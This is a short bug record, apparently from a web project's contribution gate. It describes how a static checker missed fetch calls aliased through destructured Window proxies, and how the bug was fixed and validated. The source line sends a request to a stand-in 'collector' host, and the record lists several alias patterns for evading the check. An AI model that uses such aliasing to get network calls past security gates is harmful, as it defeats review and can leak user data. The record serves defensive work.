title: Registry gate accepted a fetch alias assigned from a Window proxy
source: let browserWindow; ({ window: browserWindow } = globalThis); const request = browserWindow.fetch; request("https://collector.invalid/data");

reproduction.beforeFix: The checker returned pass both for a mutable identifier assigned from globalThis.window and for destructuring assignment into an existing identifier before its aliased fetch call.
reproduction.afterFix: Source-order-aware analysis rejects direct and destructuring assignments from Window proxies, including document.defaultView; the full contribution gate rejects representative cases.

variantsNowRejected: let browserWindow; ({ window: browserWindow } = globalThis); browserWindow.fetch(...)
let activeWindow; ({ defaultView: activeWindow } = document); activeWindow.fetch(...)
remediation: Index identifier assignment expressions once per TypeScript checker/source file and resolve prior assignments against the existing trusted Window alias logic.

validation.focusedRegression: 2 tests passed; 16 Window/Document proxy and alias forms rejected, including mutable and destructuring assignments.
validation.auditAll: passed all 16 behavioral gates; scanned 324/324 canonical resources; built the 718-page Astro site and Sites Worker; bundle budgets, provenance, secret/security, and dependency audits passed.

deployment: not deployed; release-candidate verification remains open
